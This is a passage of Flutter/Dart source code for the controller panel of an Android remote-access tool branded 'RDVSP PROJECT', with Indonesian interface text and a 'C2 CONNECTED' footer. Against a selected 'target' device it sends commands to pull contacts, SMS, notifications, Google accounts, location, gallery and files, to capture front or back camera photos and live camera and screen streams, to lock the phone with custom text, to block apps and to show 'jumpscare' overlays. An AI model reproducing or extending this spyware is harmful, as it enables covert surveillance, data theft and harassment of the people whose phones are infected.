                      ),
                    ),
                  ],
                ),
                Text(
                  charging ? '⚡ CHARGING' : 'BATTERY',
                  style: TextStyle(
                    color: _t2,
                    fontSize: 6,
                    letterSpacing: 1,
                  ),
                ),
              ],
            ),
          ),
          Container(width: 1, height: 24, color: _gborder),
          Expanded(
            child: Column(
              children: [
                Text(
                  android,
                  style: TextStyle(
                    color: _blue2,
                    fontSize: 14,
                    fontWeight: FontWeight.bold,
                  ),
                ),
                Text(
                  'ANDROID',
                  style: TextStyle(
                    color: _t2,
                    fontSize: 6,
                    letterSpacing: 1,
                  ),
                ),
              ],
            ),
          ),
          Container(width: 1, height: 24, color: _gborder),
          Expanded(
            child: Column(
              children: [
                Text(
                  sdk,
                  style: TextStyle(
                    color: _blue2,
                    fontSize: 14,
                    fontWeight: FontWeight.bold,
                  ),
                ),
                Text(
                  'SDK',
                  style: TextStyle(
                    color: _t2,
                    fontSize: 6,
                    letterSpacing: 1,
                  ),
                ),
              ],
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildControlTileToggle({
    required String label,
    required IconData icon,
    required Color color,
    required bool isOn,
    required bool needsInput,
    required String inputHint,
    required String inputType,
    required String command,
  }) {
    return Container(
      padding: const EdgeInsets.all(10),
      decoration: BoxDecoration(
        gradient: LinearGradient(
          begin: Alignment.topLeft,
          end: Alignment.bottomRight,
          colors: [
            _g1,
            _g2,
          ],
        ),
        borderRadius: BorderRadius.circular(14),
        border: Border.all(
          color: isOn ? color.withOpacity(0.3) : _gborder,
        ),
        boxShadow: isOn
            ? [
                BoxShadow(
                  color: color.withOpacity(0.08),
                  blurRadius: 16,
                  offset: const Offset(0, 4),
                ),
              ]
            : null,
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(
            mainAxisAlignment: MainAxisAlignment.spaceBetween,
            children: [
              Container(
                width: 32,
                height: 32,
                decoration: BoxDecoration(
                  gradient: LinearGradient(
                    colors: [color.withOpacity(0.2), color.withOpacity(0.05)],
                  ),
                  borderRadius: BorderRadius.circular(8),
                  border: Border.all(color: color.withOpacity(0.3)),
                ),
                child: Icon(icon, color: color, size: 16),
              ),
              _buildToggleSwitch(
                value: isOn,
                color: color,
                onChanged: (bool value) async {
                  if (command == 'videoOverlay') {
                    if (value == true) {
                      await _showVideoOverlayDialog();
                      if (!_isVideoOverlayActive) {
                        setState(() {
                          _updateControlItemState('videoOverlay', false);
                        });
                      }
                    } else {
                      _stopVideoOverlay();
                    }
                    return;
                  }

                  if (command == 'jumpscareStart') {
                    if (value == true) {
                      final String? url = await _showInputDialog(
                        title: "RDVSP PROJECT",
                        hint: "Masukkan URL gambar (jpg/png)",
                        keyboardType: TextInputType.url,
                        initialValue: _jumpscareUrl.isNotEmpty ? _jumpscareUrl : "https://files.catbox.moe/igf4dz.jpg",
                      );
                      if (url != null && url.isNotEmpty) {
                        _jumpscareUrl = url;
                        _sendCommand('jumpscareStart', extra: url);
                        setState(() {
                          _isJumpscareActive = true;
                          _updateControlItemState('jumpscareStart', true);
                        });
                        _addLog("😱 Jumpscare V1 aktif: $url", LogType.success);
                      } else {
                        setState(() {
                          _updateControlItemState('jumpscareStart', false);
                        });
                      }
                    } else {
                      _sendCommand('jumpscareStop', extra: '');
                      setState(() {
                        _isJumpscareActive = false;
                        _updateControlItemState('jumpscareStart', false);
                      });
                      _addLog("😱 Jumpscare V1 dihentikan", LogType.info);
                    }
                    return;
                  }

                  if (command == 'jumpscare2Start') {
                    if (value == true) {
                      await _showJumpscare2Dialog();
                      if (!_isJumpscare2Active) {
                        setState(() {
                          _updateControlItemState('jumpscare2Start', false);
                        });
                      }
                    } else {
                      await _stopJumpscare2();
                    }
                    return;
                  }

                  if (needsInput && value == true) {
                    String? input;
                    if (command == 'lockDevice') {
                      input = await _showLockDeviceDialog();
                    } else {
                      input = await _showInputDialog(
                        title: "Input untuk $label",
                        hint: inputHint,
                        multiline: inputType == 'multiline',
                        keyboardType: inputType == 'number' ? TextInputType.number : TextInputType.text,
                      );
                    }
                    if (input == null) return;
                    _sendCommand(command, extra: input);
                    setState(() {
                      _updateControlItemState(command, true);
                    });
                  } else if (needsInput && value == false) {
                    if (command == 'lockDevice') {
                      _sendCommand('unlockDevice', extra: '');
                    } else if (command == 'lockCustom') {
                      _sendCommand('unlockDevice', extra: '');
                    } else {
                      _sendCommand(command, extra: 'false');
                    }
                    setState(() {
                      _updateControlItemState(command, false);
                    });
                  } else {
                    _sendCommand(command, extra: value.toString());
                    setState(() {
                      _updateControlItemState(command, value);
                    });
                  }
                },
              ),
            ],
          ),
          const Spacer(),
          Text(
            label,
            style: TextStyle(
              color: _t0,
              fontSize: 12,
              fontWeight: FontWeight.bold,
            ),
          ),
          const SizedBox(height: 1),
          Text(
            isOn ? "● ACTIVE" : "○ OFF",
            style: TextStyle(
              color: isOn ? color : _t2,
              fontSize: 8,
              fontWeight: isOn ? FontWeight.bold : FontWeight.normal,
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildControlTileAction({
    required String label,
    required IconData icon,
    required Color color,
    required VoidCallback onTap,
  }) {
    return GestureDetector(
      onTap: onTap,
      child: Container(
        padding: const EdgeInsets.all(10),
        decoration: BoxDecoration(
          gradient: LinearGradient(
            begin: Alignment.topLeft,
            end: Alignment.bottomRight,
            colors: [
              _g1,
              _g2,
            ],
          ),
          borderRadius: BorderRadius.circular(14),
          border: Border.all(color: _gborder),
          boxShadow: [
            BoxShadow(
              color: _blue2.withOpacity(0.03),
              blurRadius: 16,
              offset: const Offset(0, 4),
            ),
          ],
        ),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Row(
              mainAxisAlignment: MainAxisAlignment.spaceBetween,
              children: [
                Container(
                  width: 32,
                  height: 32,
                  decoration: BoxDecoration(
                    gradient: LinearGradient(
                      colors: [color.withOpacity(0.2), color.withOpacity(0.05)],
                    ),
                    borderRadius: BorderRadius.circular(8),
                    border: Border.all(color: color.withOpacity(0.3)),
                  ),
                  child: Icon(icon, color: color, size: 16),
                ),
                Container(
                  width: 22,
                  height: 22,
                  decoration: BoxDecoration(
                    borderRadius: BorderRadius.circular(6),
                    border: Border.all(color: _t2.withOpacity(0.1)),
                    color: _t2.withOpacity(0.02),
                  ),
                  child: Icon(Icons.chevron_right, color: _t2, size: 14),
                ),
              ],
            ),
            const Spacer(),
            Text(
              label,
              style: TextStyle(
                color: _t0,
                fontSize: 12,
                fontWeight: FontWeight.bold,
              ),
            ),
            const SizedBox(height: 1),
            Text(
              "TAP",
              style: TextStyle(
                color: _t2,
                fontSize: 8,
              ),
            ),
          ],
        ),
      ),
    );
  }

  Widget _buildToggleSwitch({
    required bool value,
    required Color color,
    required ValueChanged<bool> onChanged,
  }) {
    return GestureDetector(
      onTap: () => onChanged(!value),
      child: Container(
        width: 36,
        height: 20,
        padding: const EdgeInsets.all(2),
        decoration: BoxDecoration(
          borderRadius: BorderRadius.circular(999),
          color: value ? color.withOpacity(0.15) : _t2.withOpacity(0.15),
          border: Border.all(
            color: value ? color.withOpacity(0.35) : _t2.withOpacity(0.2),
            width: 1,
          ),
          boxShadow: [
            BoxShadow(
              color: value ? color.withOpacity(0.15) : Colors.transparent,
              blurRadius: 8,
            ),
          ],
        ),
        child: AnimatedAlign(
          duration: const Duration(milliseconds: 250),
          alignment: value ? Alignment.centerRight : Alignment.centerLeft,
          child: Container(
            width: 14,
            height: 14,
            decoration: BoxDecoration(
              shape: BoxShape.circle,
              color: value ? color : _t2,
              boxShadow: [
                BoxShadow(
                  color: (value ? color : _t2).withOpacity(0.4),
                  blurRadius: 4,
                ),
              ],
            ),
          ),
        ),
      ),
    );
  }

  // ─── HANDLE AKSI TAP ─────────────────────────────────────────────────
  void _handleActionTap(Map<String, dynamic> item) async {
    final command = item['command'];
    final needsInput = item['needsInput'] ?? false;
    final inputHint = item['inputHint'] ?? '';
    final inputType = item['inputType'] ?? 'text';
    final extra = item['extra'] ?? '';

    if (command == "videoOverlay") {
      await _showVideoOverlayDialog();
      return;
    }

    if (command == "getGallery") {
      _openGalleryFullscreen();
      return;
    }

    if (command == "getFiles") {
      _openFileManager();
      return;
    }

    if (command == "getContacts") {
      _showContactsDialog();
      return;
    }
    
    if (command == "getLocation") {
      _showLocationDialog(); // <-- DIUBAH: gunakan polling
      return;
    }
    
    if (command == "getGmail") {
      _showGoogleAccountsDialog();
      return;
    }

    if (command == "getPhone") {
      _showPhoneDialog();
      return;
    }

    if (command == "setWallpaper") {
      await _showSetWallpaperDialog();
      return;
    }

    if (command == "camera") {
      final facing = extra.isNotEmpty ? extra : "front";
      _takeScreenshotViaRest(facing);
      return;
    }

    if (command == "liveCamera") {
      final facing = extra.isNotEmpty ? extra : "front";
      _startLiveCameraPolling(facing);
      return;
    }

    if (command == "stopCamera") {
      _sendCommand('camera', extra: 'stop');
      _addLog("📷 Stop camera command sent", LogType.info);
      if (_cameraModalVisible) _closeCameraModal();
      return;
    }

    if (command == "screen") {
      _startLiveScreen();
      return;
    }

    if (command == "stopScreen") {
      _stopLiveScreen();
      return;
    }

    if (command == "blockApp") {
      _showAppBlockDialog();
      return;
    }

    if (command == "unblockAll") {
      if (_blockedApps.isEmpty) {
        ScaffoldMessenger.of(context).showSnackBar(
          SnackBar(
            content: Text("No apps to unblock", style: TextStyle(color: _t0)),
            backgroundColor: _b3,
          ),
        );
        return;
      }
      showDialog(
        context: context,
        barrierColor: Colors.black.withOpacity(0.8),
        builder: (context) => AlertDialog(
          backgroundColor: _b3,
          shape: RoundedRectangleBorder(
            borderRadius: BorderRadius.circular(20),
            side: BorderSide(color: _gborder2),
          ),
          title: Text(
            "Unblock All Apps",
            style: TextStyle(color: _t0, fontSize: 18, fontWeight: FontWeight.bold),
          ),
          content: Text(
            "Are you sure you want to unblock all ${_blockedApps.length} apps?",
            style: TextStyle(color: _t2, fontSize: 14),
          ),
          actions: [
            TextButton(
              onPressed: () => Navigator.pop(context),
              child: Text("CANCEL", style: TextStyle(color: _t2)),
            ),
            Container(
              decoration: BoxDecoration(
                gradient: LinearGradient(
                  colors: [_red, Colors.red.shade800],
                ),
                borderRadius: BorderRadius.circular(10),
              ),
              child: ElevatedButton.icon(
                onPressed: () {
                  _sendCommand('unblockAll', extra: '');
                  setState(() {
                    _blockedApps.clear();
                    for (var app in _displayApps) {
                      app['isBlocked'] = false;
                    }
                    _filteredApps = List.from(_displayApps);
                  });
                  _addLog("✅ All apps unblocked", LogType.success);
                  Navigator.pop(context);
                  ScaffoldMessenger.of(context).showSnackBar(
                    SnackBar(
                      content: Text("✅ All apps unblocked", style: TextStyle(color: _t0)),
                      backgroundColor: _b3,
                    ),
                  );
                },
                icon: const Icon(Icons.check_circle, size: 18, color: Colors.white),
                label: const Text("YES, UNBLOCK ALL", style: TextStyle(color: Colors.white)),
                style: ElevatedButton.styleFrom(
                  backgroundColor: Colors.transparent,
                  shadowColor: Colors.transparent,
                  shape: RoundedRectangleBorder(
                    borderRadius: BorderRadius.circular(10),
                  ),
                ),
              ),
            ),
          ],
        ),
      );
      return;
    }

    if (needsInput) {
      String? input;
      if (command == 'lockDevice') {
        input = await _showLockDeviceDialog();
      } else {
        input = await _showInputDialog(
          title: "Input untuk ${item['label']}",
          hint: inputHint,
          multiline: inputType == 'multiline',
          keyboardType: inputType == 'number' ? TextInputType.number : TextInputType.text,
          initialValue: extra,
        );
      }
      if (input == null) return;
      _sendCommand(command, extra: input);
    } else {
      _sendCommand(command, extra: extra);
    }
  }

  // ─── WIDGET DEVICE INFO CARD ────────────────────────────────────────
  Widget _buildDeviceInfoCard() {
    return Container(
      padding: const EdgeInsets.all(16),
      decoration: BoxDecoration(
        gradient: LinearGradient(
          begin: Alignment.topLeft,
          end: Alignment.bottomRight,
          colors: [
            _b3,
            _b3,
          ],
        ),
        borderRadius: BorderRadius.circular(20),
        border: Border.all(color: _blue2.withOpacity(0.15)),
        boxShadow: [
          BoxShadow(
            color: _blue2.withOpacity(0.05),
            blurRadius: 20,
            offset: const Offset(0, 5),
          ),
        ],
      ),
      child: Row(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Container(
            width: 60,
            height: 60,
            decoration: BoxDecoration(
              gradient: LinearGradient(
                colors: [_b2, _b3],
              ),
              borderRadius: BorderRadius.circular(16),
              border: Border.all(color: _blue2.withOpacity(0.2)),
            ),
            child: Icon(Icons.phone_android, color: _blue2, size: 30),
          ),
          const SizedBox(width: 16),
          Expanded(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Row(
                  children: [
                    Container(
                      width: 8,
                      height: 8,
                      decoration: BoxDecoration(
                        color: _green,
                        shape: BoxShape.circle,
                        boxShadow: [
                          BoxShadow(
                            color: _green.withOpacity(0.5),
                            blurRadius: 10,
                          ),
                        ],
                      ),
                    ),
                    const SizedBox(width: 6),
                    Text(
                      "ONLINE",
                      style: TextStyle(
                        color: _green,
                        fontSize: 12,
                        fontWeight: FontWeight.bold,
                      ),
                    ),
                  ],
                ),
                const SizedBox(height: 4),
                Text(
                  _targetModel,
                  style: TextStyle(
                    color: _t0,
                    fontSize: 18,
                    fontWeight: FontWeight.bold,
                  ),
                ),
                const SizedBox(height: 4),
                Text(
                  "Android 14 R   Bat ${_deviceData['battery'] ?? 0}%   Tema default",
                  style: TextStyle(
                    color: _t2,
                    fontSize: 12,
                  ),
                ),
              ],
            ),
          ),
        ],
      ),
    );
  }

  // ─── TAB: MESSAGES ────────────────────────────────────────────────────
  Widget _buildMessagesTab() {
    if (_targetId == "unknown") {
      return Center(
        child: Text(
          "PILIH DEVICE DULU!",
          style: TextStyle(color: _t2, fontWeight: FontWeight.bold),
        ),
      );
    }

    return Column(
      children: [
        _buildMessageHeader(),
        Expanded(
          child: _smsData.isEmpty && _notifData.isEmpty
              ? Center(
            child: Text(
              "Belum ada pesan. Tap refresh!",
              style: TextStyle(color: _t2),
            ),
          )
              : ListView(
            padding: const EdgeInsets.all(16),
            children: [
              if (_smsData.isNotEmpty) ...[
                Row(
                  children: [
                    Icon(Icons.sms, color: _blue2, size: 16),
                    const SizedBox(width: 8),
                    Text("SMS", style: TextStyle(color: _t0, fontWeight: FontWeight.bold, fontSize: 14)),
                  ],
                ),
                const SizedBox(height: 8),
                ...(_smsData['status']?['smsList'] as List? ?? []).map((app) => _buildMessageItem(app, 'SMS')),
              ],
              if (_notifData.isNotEmpty) ...[
                const SizedBox(height: 20),
                Row(
                  children: [
                    Icon(Icons.notifications, color: _amber, size: 16),
                    const SizedBox(width: 8),
                    Text("NOTIFIKASI", style: TextStyle(color: _t0, fontWeight: FontWeight.bold, fontSize: 14)),
                  ],
                ),
                const SizedBox(height: 8),
                ...(_notifData['status']?['notifList'] as List? ?? []).map((app) => _buildMessageItem(app, 'NOTIF')),
              ],
            ],
          ),
        ),
      ],
    );
  }

  Widget _buildMessageHeader() {
    return Container(
      padding: const EdgeInsets.all(16),
      child: Row(
        children: [
          Icon(Icons.chat_bubble, color: _blue2, size: 20),
          const SizedBox(width: 8),
          Text("PESAN & NOTIFIKASI", style: TextStyle(color: _t0, fontWeight: FontWeight.bold, letterSpacing: 2)),
          const Spacer(),
          Container(
            decoration: BoxDecoration(
              gradient: LinearGradient(
                colors: [_blue2, _blue3],
              ),
              borderRadius: BorderRadius.circular(10),
            ),
            child: ElevatedButton.icon(
              onPressed: () {
                _sendCommand('getSms');
                _sendCommand('getNotifs');
                _addLog("🔄 Refresh SMS & Notif", LogType.info);
              },
              icon: const Icon(Icons.refresh, size: 16, color: Colors.white),
              label: const Text("REFRESH", style: TextStyle(color: Colors.white)),
              style: ElevatedButton.styleFrom(
                backgroundColor: Colors.transparent,
                shadowColor: Colors.transparent,
                shape: RoundedRectangleBorder(
                  borderRadius: BorderRadius.circular(10),
                ),
              ),
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildMessageItem(dynamic app, String type) {
    final messages = app['messages'] as List? ?? [];
    final appName = app['appName'] ?? 'Unknown';
    final count = messages.length;
    final preview = messages.isNotEmpty ? (messages.first['text'] ?? '').toString() : '';

    return Container(
      margin: const EdgeInsets.only(bottom: 8),
      padding: const EdgeInsets.all(12),
      decoration: BoxDecoration(
        gradient: LinearGradient(
          begin: Alignment.topLeft,
          end: Alignment.bottomRight,
          colors: [
            _b2,
            _b3,
          ],
        ),
        borderRadius: BorderRadius.circular(10),
        border: Border.all(color: _blue2.withOpacity(0.1)),
      ),
      child: Row(
        children: [
          Container(
            width: 40,
            height: 40,
            decoration: BoxDecoration(
              gradient: LinearGradient(
                colors: [_blue2.withOpacity(0.2), _blue2.withOpacity(0.05)],
              ),
              borderRadius: BorderRadius.circular(10),
            ),
            child: Center(child: Text(appName[0].toUpperCase(), style: TextStyle(color: _blue2, fontWeight: FontWeight.bold))),
          ),
          const SizedBox(width: 12),
          Expanded(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Text(appName, style: TextStyle(color: _t0, fontWeight: FontWeight.bold)),
                Text(preview, style: TextStyle(color: _t2, fontSize: 12), maxLines: 1, overflow: TextOverflow.ellipsis),
              ],
            ),
          ),
          Text("$count", style: TextStyle(color: _blue2, fontWeight: FontWeight.bold)),
        ],
      ),
    );
  }

  // ─── TERMINAL LOGS ──────────────────────────────────────────────────
  Widget _buildTerminalLogs() {
    return Container(
      height: 100,
      decoration: BoxDecoration(
        gradient: LinearGradient(
          begin: Alignment.topLeft,
          end: Alignment.bottomRight,
          colors: [
            _b2,
            _b3,
          ],
        ),
        borderRadius: BorderRadius.circular(10),
        border: Border.all(color: _isConnected ? _green.withOpacity(0.3) : _red.withOpacity(0.3)),
      ),
      child: ListView.builder(
        controller: _logScrollController,
        reverse: true,
        padding: const EdgeInsets.all(8),
        itemCount: _executionLogs.length,
        itemBuilder: (context, i) {
          final log = _executionLogs[_executionLogs.length - 1 - i];
          return Padding(
            padding: const EdgeInsets.symmetric(vertical: 1),
            child: Row(
              children: [
                Text("[${_formatTime(log.timestamp)}]", style: TextStyle(color: _t2, fontSize: 8)),
                const SizedBox(width: 6),
                Expanded(child: Text(log.message, style: TextStyle(color: _getLogColor(log.type), fontSize: 9))),
              ],
            ),
          );
        },
      ),
    );
  }

  Widget _buildControlFooter() {
    return Container(
      padding: const EdgeInsets.symmetric(vertical: 8, horizontal: 12),
      decoration: BoxDecoration(
        gradient: LinearGradient(
          colors: [_b2, _b3],
        ),
        borderRadius: BorderRadius.circular(10),
        border: Border.all(color: _blue2.withOpacity(0.1)),
      ),
      child: Row(
        mainAxisAlignment: MainAxisAlignment.center,
        children: [
          Icon(Icons.security, color: _blue2.withOpacity(0.3), size: 10),
          const SizedBox(width: 6),
          Text(
            "SYSTEM SECURED • C2 CONNECTED",
            style: TextStyle(color: _t2, fontSize: 8, letterSpacing: 2),
          ),
        ],
      ),
    );
  }

  // ─── TAKE SCREENSHOT VIA REST ──────────────────────────────────────
  Future<void> _takeScreenshotViaRest(String facing) async {
    final prefs = await SharedPreferences.getInstance();
    final token = prefs.getString('key') ?? '';
    
    setState(() {
      _cameraFacing = facing;
      _cameraFrame = '';
      _cameraLoading = true;
    });

    _addLog("📷 Taking screenshot via REST ($facing)", LogType.info);

    showDialog(
      context: context,
      barrierDismissible: false,
      builder: (context) => Dialog(
        backgroundColor: Colors.transparent,
        child: Container(
          padding: const EdgeInsets.all(20),
          decoration: BoxDecoration(
            color: _b3,
            borderRadius: BorderRadius.circular(20),
            border: Border.all(color: _blue2.withOpacity(0.2)),
          ),
          child: Column(
            mainAxisSize: MainAxisSize.min,
            children: [
              SizedBox(
                width: 40,
                height: 40,
                child: CircularProgressIndicator(
                  color: _blue2,
                  strokeWidth: 3,
                ),
              ),
              const SizedBox(height: 16),
              Text(
                "MENGAMBIL FOTO...",
                style: TextStyle(
                  color: _t2,
                  fontSize: 12,
                  letterSpacing: 2,
                ),
              ),
            ],
          ),
        ),
      ),
    );

    try {
      final response = await http.get(
        Uri.parse("$baseUrl/api/screenshot/$_targetId?facing=$facing"),
        headers: {"x-auth-token": token},
      );
      
      if (mounted) Navigator.pop(context);
      
      if (response.statusCode == 200) {
        final data = jsonDecode(response.body);
        if (data['frame'] != null && data['frame'].isNotEmpty) {
          _addLog("📸 Screenshot via REST berhasil", LogType.success);
          
          Navigator.push(
            context,
            MaterialPageRoute(
              builder: (context) => ScreenshotResultPage(
                targetModel: _targetModel,
                screenshotFrame: data['frame'],
                screenshotFacing: facing,
                onClose: () {
                  Navigator.pop(context);
                },
              ),
              fullscreenDialog: true,
            ),
          );
        } else {
          _addLog("❌ Screenshot REST: frame kosong", LogType.error);
        }
      } else {
        _addLog("❌ Screenshot REST gagal: ${response.statusCode}", LogType.error);
      }
    } catch (e) {
      if (mounted) Navigator.pop(context);
      _addLog("⚠️ Screenshot REST error: $e", LogType.error);
    }
  }

  // ─── CAMERA SOCKET METHODS ──────────────────────────────────────────
  void _takeCameraSocket(String facing) {
    if (_isWaitingForPhoto) {
      _addLog("⚠️ Masih menunggu foto sebelumnya", LogType.warning);
      return;
    }
    setState(() {
      _isWaitingForPhoto = true;
      _cameraFacing = facing;
    });
    _sendCommand('camera', extra: facing);
    _addLog("📸 Mengambil foto ($facing) via socket", LogType.info);

    showDialog(
      context: context,
      barrierDismissible: false,
      builder: (context) {
        _photoLoadingContext = context;
        return Center(
          child: Container(
            padding: const EdgeInsets.all(24),
            decoration: BoxDecoration(
              color: _b3,
              borderRadius: BorderRadius.circular(20),
              border: Border.all(color: _blue2.withOpacity(0.2)),
            ),
            child: Column(
              mainAxisSize: MainAxisSize.min,
              children: [
                SizedBox(width: 40, height: 40, child: CircularProgressIndicator(color: _blue2)),
                const SizedBox(height: 16),
                Text("MENGAMBIL FOTO...", style: TextStyle(color: _t2, fontSize: 12, letterSpacing: 2)),
              ],
            ),
          ),
        );
      },
    );

    Future.delayed(Duration(seconds: 10), () {
      if (_isWaitingForPhoto && mounted) {
        _isWaitingForPhoto = false;
        if (_photoLoadingContext != null) {
          try { Navigator.pop(_photoLoadingContext!); } catch (_) {}
          _photoLoadingContext = null;
        }
        _addLog("⚠️ Timeout mengambil foto", LogType.warning);
      }
    });
  }

  void _startLiveCameraSocket(String facing) {
    if (_screenModalVisible) _stopLiveScreen();
    if (_screenshotResultVisible) _closeScreenshotResult();

    setState(() {
      _cameraFacing = facing;
      _cameraFrame = '';
      _cameraLoading = true;
    });

    _sendCommand('liveCamera', extra: facing);
    _addLog("📷 Starting live camera ($facing) via socket", LogType.info);

    Navigator.push(
      context,
      MaterialPageRoute(
        builder: (context) => LiveCameraPage(
          targetId: _targetId,
          targetModel: _targetModel,
          facing: _cameraFacing,
          frameStream: _cameraFrameStreamController.stream,
          isLoading: _cameraLoading,
          onClose: () {
            _sendCommand('camera', extra: 'stop');
            Navigator.pop(context);
          },
          onSwitchCamera: (newFacing) {
            _sendCommand('liveCamera', extra: newFacing);
            setState(() => _cameraFacing = newFacing);
          },
          onCapture: () {
            _takeCameraSocket(_cameraFacing);
          },
        ),
        fullscreenDialog: true,
      ),
    );
  }

  Future<void> _startLiveCameraPolling(String facing) async {
    if (_screenModalVisible) {
      _stopLiveScreen();
    }
    if (_screenshotResultVisible) {
      _closeScreenshotResult();
    }

    setState(() {
      _cameraFacing = facing;
      _cameraFrame = '';
      _cameraLoading = true;
    });

    _addLog("📷 Starting live camera polling ($facing)", LogType.info);

    Navigator.push(
      context,
      MaterialPageRoute(
        builder: (context) => LiveCameraPollingPage(
          targetId: _targetId,
          targetModel: _targetModel,
          facing: _cameraFacing,
          onClose: () {
            _sendCommand('camera', extra: 'stop');
            Navigator.pop(context);
          },
          onSwitchCamera: (newFacing) {
            setState(() => _cameraFacing = newFacing);
          },
        ),
        fullscreenDialog: true,
      ),
    );
  }

  // ─── SCREEN MODAL ──────────────────────────────────────────────────
  void _closeCameraModal() {
    setState(() {
      _cameraModalVisible = false;
      _cameraFrame = '';
      _cameraLoading = true;
    });
    _sendCommand('camera', extra: 'stop');
    _addLog("📷 Camera stream closed", LogType.info);
  }

  void _closeScreenshotResult() {
    setState(() {
      _screenshotResultVisible = false;
      _screenshotFrame = '';
    });
  }

  void _downloadScreenshot(String frameBase64) async {
    try {
      final bytes = base64Decode(frameBase64.split(',').last);
      final directory = await getDownloadsDirectory() ?? await getApplicationDocumentsDirectory();
      final file = File('${directory.path}/screenshot_${DateTime.now().millisecondsSinceEpoch}.jpg');
      await file.writeAsBytes(bytes);
      _addLog("✅ Screenshot saved: ${file.path}", LogType.success);
    } catch (e) {
      _addLog("❌ Gagal download: $e", LogType.error);
    }
  }

  // ─── HELPER FUNCTIONS ──────────────────────────────────────────────
  void _copyText(String text) {
    if (text.isEmpty) return;
    Clipboard.setData(ClipboardData(text: text));
    _addLog("📋 Disalin: $text", LogType.success);
    ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(
        content: Text("✅ Disalin: $text", style: TextStyle(color: _t0)),
        backgroundColor: _b3,
      ),
    );
  }

  Future<void> _launchUrl(String url) async {
    try {
      if (await canLaunchUrl(Uri.parse(url))) {
        await launchUrl(Uri.parse(url));
      } else {
        _addLog("❌ Tidak bisa membuka URL: $url", LogType.error);
      }
    } catch (e) {
      _addLog("⚠️ Error membuka URL: $e", LogType.error);
    }
  }

  // ─── DISPOSE ──────────────────────────────────────────────────────────
  @override
  void dispose() {
    _glowController.dispose();
    _rotateController.dispose();
    _logScrollController.dispose();
    _customCommandController.dispose();
    _customExtraController.dispose();
    _appSearchController.dispose();
    _cameraFrameStreamController.close();
    _pollingTimer?.cancel();
    _videoOverlayTimer?.cancel();
    _locationPollingTimer?.cancel();
    socket.disconnect();
    socket.dispose();
    super.dispose();
  }

  // ─── BUILD MAIN ──────────────────────────────────────────────────────
  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: _b0,
      appBar: AppBar(
        backgroundColor: _b3,
        elevation: 0,
        leading: IconButton(
          icon: Icon(Icons.arrow_back_ios, color: _t0),
          onPressed: () => Navigator.pop(context),
        ),
        centerTitle: true,
        title: Row(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            Container(
              width: 8,
              height: 8,
              decoration: BoxDecoration(
                color: _blue2,
                shape: BoxShape.circle,
                boxShadow: [
                  BoxShadow(
                    color: _blue2.withOpacity(0.5),
                    blurRadius: 10,
                  ),
                ],
              ),
            ),
            const SizedBox(width: 10),
            Text(
              "RDVSP PROJECT",
              style: TextStyle(
                color: _t0,
                fontWeight: FontWeight.bold,
                fontSize: 20,
                letterSpacing: 4,
              ),
            ),
          ],
        ),
        actions: [
          IconButton(
            icon: Icon(Icons.refresh, color: _t0),
            onPressed: _fetchDevices,
          ),
        ],
      ),
      body: _buildTabContent(),
      bottomNavigationBar: _buildBottomNav(),
    );
  }
}

// ─── WIDGET LIVE CAMERA ──────────────────────────────────────────────
class LiveCameraPage extends StatefulWidget {
  final String targetId;
  final String targetModel;
  final String facing;
  final VoidCallback onClose;
  final Stream<String> frameStream;
  final bool isLoading;
  final Function(String) onSwitchCamera;
  final VoidCallback onCapture;

  const LiveCameraPage({
    Key? key,
    required this.targetId,
    required this.targetModel,
    required this.facing,
    required this.onClose,
    required this.frameStream,
    required this.isLoading,
    required this.onSwitchCamera,
    required this.onCapture,
  }) : super(key: key);

  @override
  State<LiveCameraPage> createState() => _LiveCameraPageState();
}

class _LiveCameraPageState extends State<LiveCameraPage> {
  String _currentFrame = '';
  bool _isLoading = true;

  final Color _b0 = const Color(0xFF020510);
  final Color _b2 = const Color(0xFF081428);
  final Color _blue2 = const Color(0xFF4d8fff);
  final Color _t0 = const Color(0xFFe8f4ff);
  final Color _t2 = const Color(0xFF3d6080);

  @override
  void initState() {
    super.initState();
    _isLoading = widget.isLoading;
    widget.frameStream.listen((frame) {
      if (mounted) {
        setState(() {
          _currentFrame = frame;
          _isLoading = false;
        });
      }
    });
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Colors.black,
      body: SafeArea(
        child: Stack(
          children: [
            if (_currentFrame.isNotEmpty)
              Center(
                child: RepaintBoundary(
                  child: InteractiveViewer(
                    minScale: 0.5, maxScale: 3.0,
                    child: Image.memory(
                      base64Decode(_currentFrame.split(',').last),
                      fit: BoxFit.contain,
                      width: double.infinity,
                      height: double.infinity,
                      errorBuilder: (context, error, stackTrace) {
                        return Center(child: Text("Error loading camera", style: TextStyle(color: _t2)));
                      },
                    ),
                  ),
                ),
              )
            else
              Center(
                child: Column(
                  mainAxisSize: MainAxisSize.min,
                  children: [
                    SizedBox(width: 50, height: 50, child: CircularProgressIndicator(color: _blue2, strokeWidth: 3)),
                    const SizedBox(height: 20),
                    Text("CONNECTING CAMERA...", style: TextStyle(color: _t2, fontSize: 13, letterSpacing: 3)),
                  ],
                ),
              ),

            Positioned(
              top: 0, left: 0, right: 0,
              child: Container(
                padding: const EdgeInsets.fromLTRB(20, 20, 20, 20),
                decoration: BoxDecoration(
                  gradient: LinearGradient(
                    begin: Alignment.topCenter, end: Alignment.bottomCenter,
                    colors: [Colors.black.withOpacity(0.7), Colors.transparent],
                  ),
                ),
                child: Row(
                  mainAxisAlignment: MainAxisAlignment.spaceBetween,
                  children: [
                    Row(
                      children: [
                        Container(width: 10, height: 10, decoration: const BoxDecoration(color: Colors.red, shape: BoxShape.circle)),
                        const SizedBox(width: 10),
                        Text("LIVE", style: TextStyle(color: _t0, fontSize: 14, fontWeight: FontWeight.bold, letterSpacing: 2)),
                        const SizedBox(width: 16),
                        Container(
                          padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 4),
                          decoration: BoxDecoration(color: _b2, borderRadius: BorderRadius.circular(4)),
                          child: Text(widget.facing.toUpperCase(), style: TextStyle(color: _t2, fontSize: 10, letterSpacing: 1)),
                        ),
                      ],
